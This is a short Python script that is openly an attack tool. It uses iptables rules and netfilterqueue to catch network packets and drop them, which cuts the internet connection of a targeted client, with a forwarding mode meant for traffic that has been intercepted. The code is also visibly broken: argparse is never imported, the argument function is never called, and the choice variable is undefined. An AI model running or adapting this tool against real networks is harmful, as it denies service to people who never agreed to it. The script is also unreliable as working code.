#!/usr/bin/env python3

# @Author - Avish Dhirawat
# Date - 13/08/2020

import netfilterqueue
import subprocess

# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)

def get_arguments(): # Function to get arguments in command line
    parser = argparse.ArgumentParser()

    parser.add_argument('-c', '--choice', dest = "choice", default = 2, help = "Choice for Intersystem Spoofing(1) and Intrasystem Spoofing(2)")
    options = parser.parse_args()
    if options.choice not in [1,2,"1","2"]:
        parser.error("[-] Please enter correct options for choice, use --help for more info")
    else:
        return options

def process_packet(packet):
    if(choice == 1 or choice == "1"): # Had to add "or" condition so that it supports both python2 and python3
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created IPTABLE for FORWARD\n")
    elif(choice == 2 or choice == "2"):
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell = True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell = True)
    print("[+] Cutting the internet connection........")
    print(packet)
    #packet.accept() # Used to forward the packets to the client
    packet.drop() # Cut the internet connection of the client

try:
    queue = netfilterqueue.NetfilterQueue()
    # iptables -I FORWARD -j NFQUEUE --queue-num 0
    queue.bind(0, process_packet) # 0 is queue number/id that we given in above command while storing the iptable to a queue.
    queue.run()

except KeyboardInterrupt:
    print("[-] Detected CTRL + C .... Exiting.....")
    # iptables --flush to delete the iptables we created
    subprocess.call("iptables --flush", shell = True)
